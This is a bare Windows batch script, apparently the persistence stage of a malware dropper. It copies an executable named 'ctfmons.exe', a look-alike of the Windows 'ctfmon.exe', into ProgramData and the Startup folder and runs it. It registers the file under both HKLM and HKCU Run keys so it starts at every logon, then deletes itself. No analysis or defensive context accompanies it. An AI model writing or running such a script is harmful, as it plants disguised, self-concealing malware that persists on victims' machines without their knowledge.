@echo off
copy ctfmons.exe c:\programdata\ctfmons.exe
copy c:\users\public\downloads\ctfmons.exe c:\programdata\ctfmons.exe
copy c:\programdata\ctfmons.exe "%appdata%\Microsoft\Windows\Start Menu\Programs\Startup\ctfmons.exe"
start c:\programdata\ctfmons.exe
reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v ctfmons /t REG_SZ /d C:\programdata\ctfmons.exe /f
reg add HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v ctfmons /t REG_SZ /d C:\programdata\ctfmons.exe /f
del %0
pause